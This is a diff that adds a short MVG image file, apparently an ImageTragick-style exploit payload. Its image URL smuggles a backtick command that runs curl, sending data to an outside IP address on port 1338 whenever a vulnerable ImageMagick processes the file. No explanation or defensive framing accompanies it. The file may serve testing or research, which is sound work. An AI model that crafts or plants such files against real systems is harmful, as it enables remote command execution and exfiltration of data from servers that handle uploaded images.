@@ -1,0 +1,4 @@
+push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'http://45.10.20.101:1338/x.php?x=%60curl "http://45.10.20.101:1338/" -d @- > /dev/null`'
+pop graphic-context
